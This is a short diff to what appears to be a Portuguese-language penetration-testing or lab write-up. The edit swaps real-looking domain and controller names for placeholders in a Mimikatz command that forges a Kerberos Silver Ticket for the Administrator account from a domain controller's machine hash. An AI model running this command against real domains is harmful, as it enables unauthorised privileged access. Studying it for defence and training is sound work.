@@ -113,7 +113,7 @@ Então, após ter o controle da máquina, com o Mimikatz nós extraimos o hash d
 
 Realizamos o Silver Ticket
 
-`Invoke-Mimikatz -Command '"kerberos::golden /domain:us.funcorp.local /sid:S-1-5-21-3965405831-1015596948-2589850225 /target:ufc-dc1.us.funcorp.local /service:HOST /rc4:hash do DC$ /user:Administrator /ptt"'`
+`Invoke-Mimikatz -Command '"kerberos::golden /domain:xxxxx.local /sid:S-1-5-21-3965405831-1015596948-2589850225 /target:dc.xx.local /service:HOST /rc4:hash do DC$ /user:Administrator /ptt"'`
 
 ```
 /domain:domínio que estou
